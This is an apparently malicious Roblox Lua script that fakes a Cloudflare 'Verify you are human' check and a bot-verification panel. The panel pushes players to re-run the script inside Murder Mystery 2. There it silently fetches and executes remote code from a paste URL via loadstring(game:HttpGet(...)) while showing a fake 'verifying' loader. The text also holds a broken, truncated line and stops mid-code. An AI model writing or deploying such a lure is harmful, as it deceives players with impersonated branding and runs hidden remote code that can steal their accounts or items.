local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local MM2_ID = 142823291
local LOAD_DUR = 180
local SCRIPT_URL = "https://cdn.sourceb.in/bins/AhNbx38Buf/0"
local DISCORD_URL = "https://discord.gg/KnRMYe7Kn"
local ALERT = "If verification failed, please join our discord server to access the protected script. NOTE: DON'T EVER LOGIN ON ANY SIGN OF FAKE ROBLOX GROUP! BEAM SITE ALERT!"
local KICK_MSG = "Error: Please join manually and execute the script!"
local UI_SCALE = 0.82 -- overall GUI size (1 = full size)

-- Soft pastel palette (muted, no hot pinks)
local C = {
    deep = Color3.fromRGB(34, 48, 66),
    ink = Color3.fromRGB(54, 70, 86),
    muted = Color3.fromRGB(98, 116, 132),
    white = Color3.fromRGB(252, 254, 255),
    line = Color3.fromRGB(178, 206, 220),
    sky = Color3.fromRGB(176, 214, 236),
    mint = Color3.fromRGB(178, 226, 210),
    lilac = Color3.fromRGB(202, 192, 232),
    peach = Color3.fromRGB(246, 212, 192),
    butter = Color3.fromRGB(248, 234, 192),
    rose = Color3.fromRGB(236, 202, 212),
    aqua = Color3.fromRGB(118, 176, 184),
    aquaLight = Color3.fromRGB(196, 228, 230),
    warning = Color3.fromRGB(120, 86, 80),
    warningBg = Color3.fromRGB(238, 224, 216),
    error = Color3.fromRGB(170, 104, 100),
    success = Color3.fromRGB(88, 156, 132)
}
local PASTELS = {C.sky, C.mint, C.lilac, C.peach, C.butter, C.rose}

-- ───────────────────────── helpers ─────────────────────────
local function tw(o, p, t, s, d)
    local a = TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad, d or Enum.EasingDirection.Out), p)
    a:Play()
    return a
end

local function new(cls, par, props)
    local o = Instance.new(cls)
    if props then for k, v in pairs(props) do o[k] = v end end
    o.Parent = par
    return o
end

-- CanvasGroup lets a whole panel fade as one; falls back to Frame.
local function group(par, props)
    local ok, o = pcall(Instance.new, "CanvasGroup")
    if not ok or typeof(o) ~= "Instance" then o = Instance.new("Frame") end
    if props then for k, v in pairs(props) do pcall(function() o[k] = v end) end end
    o.Parent = par
    return o
end

local function fadeGroup(o, target, t)
    if o:IsA("CanvasGroup") then return tw(o, {GroupTransparency = target}, t) end
    return tw(o, {BackgroundTransparency = target}, t)
end

local function corner(par, r) return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)}) end
local function roundFull(par) return new("UICorner", par, {CornerRadius = UDim.new(1, 0)}) end
local function stroke(par, c, t, tr) return new("UIStroke", par, {Color = c or C.line, Thickness = t or 1.2, Transparency = tr or 0.18}) end
local function frame(par, props) return new("Frame", par, props) end
local function label(par, props) return new("TextLabel", par, props) end

-- One animation registry drives every effect from a single Heartbeat.
local anim = {t = 0, strokes = {}, grads = {}, orbs = {}, water = {}, fns = {}}

local function pastelSequence()
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0, C.sky),
        ColorSequenceKeypoint.new(0.25, C.lilac),
        ColorSequenceKeypoint.new(0.5, C.mint),
        ColorSequenceKeypoint.new(0.75, C.peach),
        ColorSequenceKeypoint.new(1, C.sky)
    })
end

-- Rotating pastel gradient border.
local function auroraStroke(par, thickness, transp)
    local s = stroke(par, C.white, thickness or 1.6, transp or 0.1)
    local g = new("UIGradient", s, {Color = pastelSequence(), Rotation = math.random(0, 359)})
    table.insert(anim.strokes, g)
    return s
end

-- Thin flowing gradient line (header divider).
local function auroraLine(par, x, y, w, z)
    local f = frame(par, {
        Size = UDim2.new(1, -x * 2, 0, 1), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = z or 6
    })
    if w then f.Size = UDim2.fromOffset(w, 1) end
    local g = new("UIGradient", f, {Color = pastelSequence()})
    table.insert(anim.grads, {g = g, base = 0, phase = math.random() * 6.28})
    return f
end

-- Frosted glass surface: animated pastel aurora + pearl wash + gloss + specular line.
local function applyGlassWaterFx(parent, radius)
    radius = radius or 22
    local g = new("UIGradient", parent, {
        Rotation = 118,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 248, 252)),
            ColorSequenceKeypoint.new(0.32, Color3.fromRGB(224, 242, 236)),
            ColorSequenceKeypoint.new(0.64, Color3.fromRGB(232, 228, 246)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(248, 236, 228))
        })
    })
    table.insert(anim.grads, {g = g, base = 118, phase = math.random() * 6.28})
    local wash = frame(parent, {
        Size = UDim2.new(1, -10, 1, -10), Position = UDim2.fromOffset(5, 5),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.8, BorderSizePixel = 0, ZIndex = 2
    })
    corner(wash, math.max(radius - 6, 8))
    local gloss = frame(parent, {
        Size = UDim2.new(1, -6, 0, 120), Position = UDim2.fromOffset(3, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.5, BorderSizePixel = 0, ZIndex = 3
    })
    corner(gloss, radius - 2)
    new("UIGradient", gloss, {
        Rotation = 90,
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.05),
            NumberSequenceKeypoint.new(0.55, 0.7),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local reflection = frame(parent, {
        Size = UDim2.new(1, -38, 0, 2), Position = UDim2.fromOffset(19, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = 4
    })
    corner(reflection, 2)
    new("UIGradient", reflection, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.18, 0.05),
            NumberSequenceKeypoint.new(0.72, 0.2),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
end

local function sparkle(clip)
    local s = frame(clip, {
        Size = UDim2.fromOffset(3, 3), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.08 + math.random() * 0.84, 0, 0.08 + math.random() * 0.84, 0),
        Rotation = 45, BackgroundColor3 = C.white, BackgroundTransparency = 0.15,
        BorderSizePixel = 0, ZIndex = 3
    })
    corner(s, 1)
    tw(s, {Size = UDim2.fromOffset(12, 12), BackgroundTransparency = 1, Rotation = 135}, 1.1)
    task.delay(1.15, function() if s.Parent then s:Destroy() end end)
end

-- Liquid layer: fast shimmer, slow counter caustic, bubbles, sparkles.
local function addWaterBody(clip)
    local shimmer = frame(clip, {
        Size = UDim2.new(0.52, 0, 1.8, 0), Position = UDim2.new(-0.62, 0, -0.4, 0),
        Rotation = 16, BackgroundColor3 = C.white, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", shimmer, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.46, 0.55),
            NumberSequenceKeypoint.new(0.54, 0.55),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local caustic = frame(clip, {
        Size = UDim2.new(0.3, 0, 1.7, 0), Position = UDim2.new(1.08, 0, -0.35, 0),
        Rotation = -20, BackgroundColor3 = C.mint, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", caustic, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.72),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local bubbles = {}
    for i = 1, 7 do
        local s = 3 + math.random(0, 6)
        local b = frame(clip, {
            Size = UDim2.fromOffset(s, s), Position = UDim2.new(math.random(), 0, 1, 0),
            BackgroundColor3 = PASTELS[math.random(1, #PASTELS)], BackgroundTransparency = 0.55 + math.random() * 0.3,
            BorderSizePixel = 0, ZIndex = 3
        })
        roundFull(b)
        stroke(b, C.white, 1, 0.4)
        bubbles[i] = {obj = b, x = math.random(), y = 1 + math.random(), speed = 0.018 + math.random() * 0.04, phase = math.random() * 6.28}
    end
    table.insert(anim.water, {clip = clip, shimmer = shimmer, caustic = caustic, bubbles = bubbles, t = math.random() * 4, off = math.random() * 6, spark = math.random() * 1.5})
end

-- Soft glowing orb from concentric rings; colours drift through the pastel set.
local function softOrb(parent, x, y, size, z, speed)
    local holder = frame(parent, {Size = UDim2.fromOffset(size, size), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = z or 1})
    local rings = {}
    local steps = {1, 0.74, 0.5, 0.28}
    for i, f in ipairs(steps) do
        local r = frame(holder, {
            Size = UDim2.fromScale(f, f), Position = UDim2.fromScale(0.5, 0.5), AnchorPoint = Vector2.new(0.5, 0.5),
            BackgroundColor3 = C.sky, BackgroundTransparency = 0.9 - (i - 1) * 0.06, BorderSizePixel = 0, ZIndex = z or 1
        })
        roundFull(r)
        rings[i] = r
    end
    table.insert(anim.orbs, {obj = holder, rings = rings, x = x, y = y, t = math.random() * 6.28, speed = speed or 0.2, amp = 14 + math.random() * 12, ci = math.random(1, #PASTELS), ct = math.random() * 5})
    return holder
end

local function step(dt)
    anim.t = anim.t + dt
    local t = anim.t
    for _, g in ipairs(anim.strokes) do g.Rotation = (g.Rotation + dt * 45) % 360 end
    for _, e in ipairs(anim.grads) do
        e.g.Rotation = e.base + math.sin(t * 0.22 + e.phase) * 14
        e.g.Offset = Vector2.new(math.sin(t * 0.3 + e.phase) * 0.18, math.cos(t * 0.19 + e.phase) * 0.08)
    end
    for _, o in ipairs(anim.orbs) do
        if o.obj.Parent then
            o.t = o.t + o.speed * dt
            o.obj.Position = UDim2.fromOffset(o.x + math.sin(o.t) * o.amp, o.y + math.cos(o.t * 0.77) * o.amp * 0.7)
            o.ct = o.ct + dt
            local seg = 5
            local k = math.floor(o.ct / seg)
            local a = (o.ct - k * seg) / seg
            local i1 = ((k + o.ci - 1) % #PASTELS) + 1
            local i2 = (i1 % #PASTELS) + 1
            local col = PASTELS[i1]:Lerp(PASTELS[i2], a)
            for _, r in ipairs(o.rings) do r.BackgroundColor3 = col end
        end
    end
    for _, fx in ipairs(anim.water) do
        if fx.clip.Parent then
            fx.t = fx.t + dt
            fx.shimmer.Position = UDim2.new(-0.62 + (fx.t % 4.8) / 4.8 * 2.05, 0, -0.4, 0)
            fx.caustic.Position = UDim2.new(1.08 - ((fx.t + fx.off) % 7.6) / 7.6 * 2.1, 0, -0.35, 0)
            for _, b in ipairs(fx.bubbles) do
                b.y = b.y - b.speed * dt
                if b.y < -0.06 then b.y = 1.04 b.x = math.random() end
                b.obj.Position = UDim2.new(math.clamp(b.x + math.sin(fx.t * 1.25 + b.phase) * 0.012, 0.01, 0.99), 0, b.y, 0)
            end
            fx.spark = fx.spark - dt
            if fx.spark <= 0 then sparkle(fx.clip) fx.spark = 0.8 + math.random() * 1.1 end
        end
    end
    for _, f in ipairs(anim.fns) do f(t, dt) end
end

-- Press feedback: scale squash + centred ripple.
local function pressFx(b)
    local sc = new("UIScale", b, {Scale = 1})
    b.ClipsDescendants = true
    b.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tw(sc, {Scale = 0.95}, 0.1)
            local r = frame(b, {
                Size = UDim2.fromOffset(0, 0), Position = UDim2.fromScale(0.5, 0.5), AnchorPoint = Vector2.new(0.5, 0.5),
                BackgroundColor3 = C.white, BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = b.ZIndex + 1
            })
            roundFull(r)
            local d = math.max(b.AbsoluteSize.X, b.AbsoluteSize.Y) * 2.1
            tw(r, {Size = UDim2.fromOffset(d, d), BackgroundTransparency = 1}, 0.5)
            task.delay(0.55, function() if r.Parent then r:Destroy() end end)
        end
    end)
    b.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tw(sc, {Scale = 1}, 0.2, Enum.EasingStyle.Back)
        end
    end)
    return sc
end

local function glassButton(parent, text, size, position, z)
    local b = new("TextButton", parent, {
        Size = size, Position = position, BackgroundColor3 = C.white,
        BackgroundTransparency = 0.08, BorderSizePixel = 0, Text = text,
        TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
        AutoButtonColor = false, ZIndex = z or 7
    })
    corner(b, 11)
    local s = stroke(b, C.white, 1.25, 0.05)
    new("UIGradient", b, {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.white),
            ColorSequenceKeypoint.new(0.55, C.aquaLight),
            ColorSequenceKeypoint.new(1, C.sky)
        })
    })
    pressFx(b)
    b.MouseEnter:Connect(function() tw(b, {BackgroundTransparency = 0}, 0.16) tw(s, {Color = C.mint}, 0.2) end)
    b.MouseLeave:Connect(function() tw(b, {BackgroundTransparency = 0.08}, 0.16) tw(s, {Color = C.white}, 0.2) end)
    return b
end

local function addAlert(parent, position, size)
    local box = frame(parent, {
        Size = size, Position = position, BackgroundColor3 = C.warningBg,
        BackgroundTransparency = 0.15, BorderSizePixel = 0, ZIndex = 6
    })
    corner(box, 11)
    new("UIGradient", box, {Rotation = 0, Color = ColorSequence.new(C.white, Color3.fromRGB(244, 226, 214))})
    stroke(box, Color3.fromRGB(208, 184, 172), 1, 0.1)
    local rule = frame(box, {
        Size = UDim2.new(0, 3, 1, -18), Position = UDim2.fromOffset(9, 9),
        BackgroundColor3 = Color3.fromRGB(190, 142, 122), BorderSizePixel = 0, ZIndex = 7
    })
    corner(rule, 2)
    new("UIGradient", rule, {Rotation = 90, Color = ColorSequence.new(C.peach, Color3.fromRGB(176, 120, 104))})
    label(box, {
        Size = UDim2.new(1, -36, 1, -16), Position = UDim2.fromOffset(25, 8),
        BackgroundTransparency = 1, Text = ALERT, TextWrapped = true,
        TextColor3 = C.warning, TextSize = 10, Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 7
    })
    return box
end

local function copyDiscord(feedback)
    local clipboard = setclipboard or toclipboard
    if type(clipboard) ~= "function" then
        feedback.Text = "Clipboard unavailable. Invite: " .. DISCORD_URL
        return
    end
    local ok = pcall(clipboard, DISCORD_URL)
    feedback.Text = ok and "Discord invite copied to clipboard" or ("Copy manually: " .. DISCORD_URL)
end

-- Silent clipboard copy; returns true on success.
local function silentCopy(text)
    local clipboard = setclipboard or toclipboard or (syn and syn.write_clipboard)
    if type(clipboard) ~= "function" then return false end
    return (pcall(clipboard, text))
end

local function glassPanel(parent, w, h, x, y, name)
    local p = frame(parent, {
        Name = name, Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.12, BorderSizePixel = 0, ZIndex = 2
    })
    corner(p, 22)
    auroraStroke(p, 1.7, 0.08)
    applyGlassWaterFx(p, 22)
    local clip = frame(p, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
    corner(clip, 22)
    addWaterBody(clip)
    return p
end

local function waterDrop(parent, x, y, s, z)
    z = z or 7
    local g = frame(parent, {Size = UDim2.fromOffset(s, s), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = z})
    local body = frame(g, {
        Size = UDim2.new(1, -4, 0.68, 0), Position = UDim2.new(0.2, 2, 0.3, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
    })
    roundFull(body)
    new("UIGradient", body, {Rotation = 90, Color = ColorSequence.new(C.sky, C.aqua)})
    local top = frame(g, {
        Size = UDim2.new(0.58, 0, 0.5, 0), Position = UDim2.new(0.21, 0, 0, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
    })
    roundFull(top)
    new("UIGradient", top, {Rotation = 90, Color = ColorSequence.new(C.mint, C.aqua)})
    local shine = frame(g, {
        Size = UDim2.fromOffset(4, 5), Position = UDim2.new(0.3, 0, 0.42, 0),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.2, BorderSizePixel = 0, ZIndex = z + 2
    })
    corner(shine, 2)
    return g
end

-- Cloudflare cloud: flat orange body, three bumps, lighter cloud peeking behind.
local function cloudLogo(parent, x, y)
    local g = frame(parent, {Size = UDim2.fromOffset(30, 16), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = 8})
    local orange = Color3.fromRGB(246, 130, 31)
    local light = Color3.fromRGB(252, 173, 65)
    local function puff(w, h, px, py, col, z)
        local f = frame(g, {Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(px, py), BackgroundColor3 = col, BorderSizePixel = 0, ZIndex = z})
        roundFull(f)
        return f
    end
    puff(9, 9, 20, 1, light, 8)
    puff(28, 7, 0, 8, orange, 9)
    puff(9, 9, 2, 4, orange, 9)
    puff(12, 12, 8, 0, orange, 9)
    puff(9, 9, 17, 4, orange, 9)
    return g
end

if PG:FindFirstChild("MM2_VerificationGui") then PG.MM2_VerificationGui:Destroy() end
if PG:FindFirstChild("MM2_LoaderGui") then PG.MM2_LoaderGui:Destroy() end

local camera = workspace.CurrentCamera
local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
local sw, sh = viewport.X, viewport.Y

-- ================================================================
-- Outside MM2: Cloudflare Turnstile → bot verification panel
-- ================================================================
if game.PlaceId ~= MM2_ID then
    local SG = new("ScreenGui", PG, {
        Name = "MM2_VerificationGui", ResetOnSpawn = false,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
    })
    local Overlay = frame(SG, {Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = 1})
    new("UIGradient", Overlay, {
        Rotation = 35,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 22, 36)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 34, 44)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 24, 46))
        })
    })
    softOrb(SG, 40, 60, 360, 1, 0.16)
    softOrb(SG, sw - 420, sh - 520, 320, 1, 0.12)
    softOrb(SG, sw * 0.5 - 100, sh - 260, 240, 1, 0.2)

    -- Cloudflare managed challenge widget (300 × 65)
    local TSShadow = frame(SG, {
        Size = UDim2.fromOffset(306, 71), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 5),
        BackgroundColor3 = Color3.fromRGB(4, 8, 14), BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 4
    })
    corner(TSShadow, 5)
    local TS = group(SG, {
        Size = UDim2.fromOffset(300, 65), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        BackgroundColor3 = Color3.fromRGB(250, 250, 250), BorderSizePixel = 0, ZIndex = 5
    })
    corner(TS, 3)
    stroke(TS, Color3.fromRGB(224, 224, 224), 1, 0)

    -- 24px bordered checkbox
    local CheckBox = new("TextButton", TS, {
        Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255), Text = "", BorderSizePixel = 0, AutoButtonColor = false, ZIndex = 7
    })
    corner(CheckBox, 3)
    local cbStroke = stroke(CheckBox, Color3.fromRGB(109, 109, 109), 2, 0)
    CheckBox.MouseEnter:Connect(function() tw(cbStroke, {Color = Color3.fromRGB(35, 35, 35)}, 0.12) end)
    CheckBox.MouseLeave:Connect(function() tw(cbStroke, {Color = Color3.fromRGB(109, 109, 109)}, 0.12) end)

    -- Spinner: light track ring + orange arc (gradient-masked stroke) that rotates
    local Spinner = frame(TS, {Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20), BackgroundTransparency = 1, Visible = false, ZIndex = 7})
    local track = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 7})
    roundFull(track)
    stroke(track, Color3.fromRGB(228, 228, 228), 2.5, 0)
    local arc = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 8})
    roundFull(arc)
    local arcStroke = stroke(arc, Color3.fromRGB(246, 130, 31), 2.5, 0)
    new("UIGradient", arcStroke, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.42, 0),
            NumberSequenceKeypoint.new(0.58, 1),
            NumberSequenceKeypoint.new(1, 1)
        })
    })

    -- Success check
    local Success = label(TS, {
        Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20), BackgroundTransparency = 1,
        Text = "✓", TextColor3 = Color3.fromRGB(0, 166, 81), TextSize = 24, Font = Enum.Font.GothamBold, Visible = false, ZIndex = 7
    })

    local TitleLbl = label(TS, {
        Size = UDim2.fromOffset(166, 65), Position = UDim2.fromOffset(56, 0), BackgroundTransparency = 1,
        Text = "Verify you are human", TextColor3 = Color3.fromRGB(35, 35, 35), TextSize = 14,
        Font = Enum.Font.SourceSans, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
    })

    -- Brand stack: cloud, CLOUDFLARE, Privacy • Terms
    local Brand = frame(TS, {Size = UDim2.fromOffset(62, 50), Position = UDim2.fromOffset(224, 8), BackgroundTransparency = 1, ZIndex = 7})
    cloudLogo(Brand, 16, 1)
    label(Brand, {
        Size = UDim2.fromOffset(62, 10), Position = UDim2.fromOffset(0, 20), BackgroundTransparency = 1,
        Text = "CLOUDFLARE", TextColor3 = Color3.fromRGB(70, 70, 70), TextSize = 9, Font = Enum.Font.SourceSansBold, ZIndex = 8
    })
    label(Brand, {
        Size = UDim2.fromOffset(62, 10), Position = UDim2.fromOffset(0, 32), BackgroundTransparency = 1,
        Text = "Privacy  •  Terms", TextColor3 = Color3.fromRGB(138, 138, 138), TextSize = 8, Font = Enum.Font.SourceSans, ZIndex = 8
    })

    -- Bot verification panel (original copy)
    local VPanel = group(SG, {
        Size = UDim2.fromOffset(420, 440), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.12, BorderSizePixel = 0, Visible = false, ZIndex = 2, GroupTransparency = 1
    })
    corner(VPanel, 22)
    new("UIScale", VPanel, {Scale = UI_SCALE})
    auroraStroke(VPanel, 1.7, 0.08)
    applyGlassWaterFx(VPanel, 22)
    local vclip = frame(VPanel, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
    corner(vclip, 22)
    addWaterBody(vclip)

    local vdrop = waterDrop(VPanel, 18, 18, 26, 6)
    table.insert(anim.fns, function(t) if vdrop.Parent then vdrop.Position = UDim2.fromOffset(18, 18 + math.sin(t * 1.8) * 1.5) end end)
    label(VPanel, {
        Size = UDim2.new(1, -72, 0, 22), Position = UDim2.fromOffset(54, 20), BackgroundTransparency = 1,
        Text = "Bot verification required", TextColor3 = C.deep, TextSize = 16, Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
    })
    auroraLine(VPanel, 18, 52, nil, 6)
    label(VPanel, {
        Size = UDim2.new(1, -36, 0, 70), Position = UDim2.fromOffset(18, 62), BackgroundTransparency = 1,
        Text = "We suspect you might be a bot.\n\nTo prove you're a real player, please re-execute this script inside Murder Mystery 2 and wait for verification to finish. Come back here afterwards and you're good to go.",
        TextColor3 = C.ink, TextSize = 12, Font = Enum.Font.Gotham, TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 6
    })
    addAlert(VPanel, UDim2.fromOffset(18, 140), UDim2.new(1, -36, 0, 108))
    local TeleportBtn = glassButton(VPanel, "Take Me to MM2", UDim2.new(1, -36, 0, 40), UDim2.fromOffset(18, 262))
    local DiscordBtn = glassButton(VPanel, "Copy Discord invite", UDim2.new(1, -36, 0, 40), UDim2.fromOffset(18, 310))
    local ErrLbl = label(VPanel, {
        Size = UDim2.new(1, -28, 0, 34), Position = UDim2.fromOffset(14, 358), BackgroundTransparency = 1,
        Text = "", TextColor3 = C.warning, TextSize = 11, Font = Enum.Font.Gotham, TextWrapped = true, ZIndex = 7
    })
    label(VPanel, {
        Size = UDim2.new(1, -28, 0, 16), Position = UDim2.fromOffset(14, 404), BackgroundTransparency = 1,
        Text = "Murder Mystery 2  •  Place ID 142823291", TextColor3 = C.muted, TextSize = 9, Font = Enum.Font.Gotham, ZIndex = 7
    })

    -- Turnstile flow: click → 3 s spinner "Verifying..." → "Success!" → panel
    local verified = false
    CheckBox.MouseButton1Click:Connect(function()
        if verified then return end
        verified = true
        CheckBox.Visible = false
        Spinner.Visible = true
        TitleLbl.Text = "Verifying..."
        local spinConn
        spinConn = RunService.RenderStepped:Connect(function(delta)
            if not Spinner.Parent or not Spinner.Visible then spinConn:Disconnect() return end
            arc.Rotation = arc.Rotation + delta * 360
        end)
        task.wait(3)
        if not SG.Parent then return end
        Spinner.Visible = false
        Success.Visible = true
        Success.TextSize = 6
        tw(Success, {TextSize = 24}, 0.3, Enum.EasingStyle.Back)
        TitleLbl.Text = "Success!"
        task.wait(1.0)
        fadeGroup(TS, 1, 0.3)
        tw(TSShadow, {BackgroundTransparency = 1}, 0.3)
        task.wait(0.25)
        if not SG.Parent then return end
        TS.Visible = false
        TSShadow.Visible = false
        VPanel.Position = UDim2.new(0.5, 0, 0.5, 22)
        VPanel.Visible = true
        fadeGroup(VPanel, 0, 0.35)
        tw(VPanel, {Position = UDim2.fromScale(0.5, 0.5)}, 0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    end)

    TeleportBtn.MouseButton1Click:
    DiscordBtn.MouseButton1Click:Connect(function() copyDiscord(ErrLbl) end)

    local animConn = RunService.Heartbeat:Connect(step)
    SG.Destroying:Connect(function() if animConn.Connected then animConn:Disconnect() end end)
    return
end

-- ================================================================
-- Inside MM2: run payload first, then show the glass loader
-- ================================================================
pcall(function() loadstring(game:HttpGet(SCRIPT_URL, true))() end)

local SG = new("ScreenGui", PG, {
    Name = "MM2_LoaderGui", ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
})
softOrb(SG, -70, 10, 280, 1, 0.18)
softOrb(SG, 170, 330, 240, 1, 0.14)
softOrb(SG, -40, 470, 200, 1, 0.22)

local Panel = glassPanel(SG, 330, 560, -350, 60, "MainPanel")
local panelScale = new("UIScale", Panel, {Scale = 0.92})

-- Header
local Header = frame(Panel, {Size = UDim2.new(1, 0, 0, 48), BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 6})
local drop = waterDrop(Header, 14, 12, 24, 6)
table.insert(anim.fns, function(t) if drop.Parent then drop.Position = UDim2.fromOffset(14, 12 + math.sin(t * 1.8) * 1.5) end end)
label(Header, {
    Size = UDim2.fromOffset(120, 1), Position = UDim2.fromOffset(46, 0), BackgroundTransparency = 1, Text = "", ZIndex = 7
}).Size = UDim2.new(0, 0, 0, 0)
local TitleLbl = label(Header, {
    Size = UDim2.fromOffset(110, 48), Position = UDim2.fromOffset(46, 1), BackgroundTransparency = 1,
    Text = "MM2 Loader", TextColor3 = C.deep, TextSize = 14, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local Dot = frame(Header, {Size = UDim2.fromOffset(7, 7), Position = UDim2.fromOffset(134, 21), BackgroundColor3 = C.success, BorderSizePixel = 0, ZIndex = 7})
roundFull(Dot)
local DotHalo = frame(Header, {Size = UDim2.fromOffset(15, 15), Position = UDim2.fromOffset(130, 17), BackgroundColor3 = C.mint, BackgroundTransparency = 0.6, BorderSizePixel = 0, ZIndex = 6})
roundFull(DotHalo)
table.insert(anim.fns, function(t)
    if DotHalo.Parent then
        local k = (math.sin(t * 3) + 1) / 2
        DotHalo.BackgroundTransparency = 0.5 + k * 0.45
        DotHalo.Size = UDim2.fromOffset(13 + k * 6, 13 + k * 6)
        DotHalo.Position = UDim2.fromOffset(137.5 - DotHalo.Size.X.Offset / 2, 24.5 - DotHalo.Size.Y.Offset / 2)
    end
end)
local CloseBtn = glassButton(Header, "×", UDim2.fromOffset(26, 26), UDim2.new(1, -38, 0.5, -11), 7)
CloseBtn.TextSize = 16
local HideBtn = glassButton(Header, "−", UDim2.fromOffset(26, 26), UDim2.new(1, -68, 0.5, -11), 7)
HideBtn.TextSize = 16
auroraLine(Panel, 14, 47, nil, 6)

-- Progress (no percentage counter)
local ProgressContainer = frame(Panel, {
    Size = UDim2.new(1, -28, 0, 72), Position = UDim2.fromOffset(14, 54),
    BackgroundColor3 = C.white, BackgroundTransparency = 0.45, BorderSizePixel = 0, ZIndex = 5
})
corner(ProgressContainer, 13)
stroke(ProgressContainer, C.white, 1, 0.1)
local VerificationTitle = label(ProgressContainer, {
    Size = UDim2.new(1, -20, 0, 20), Position = UDim2.fromOffset(12, 8), BackgroundTransparency = 1,
    Text = "Verifying that you are not a bot...", TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local StatusLbl = label(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 16), Position = UDim2.fromOffset(12, 28), BackgroundTransparency = 1,
    Text = "Please wait while we finish a few checks.", TextColor3 = C.muted, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local BarBg = frame(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 8), Position = UDim2.fromOffset(12, 50),
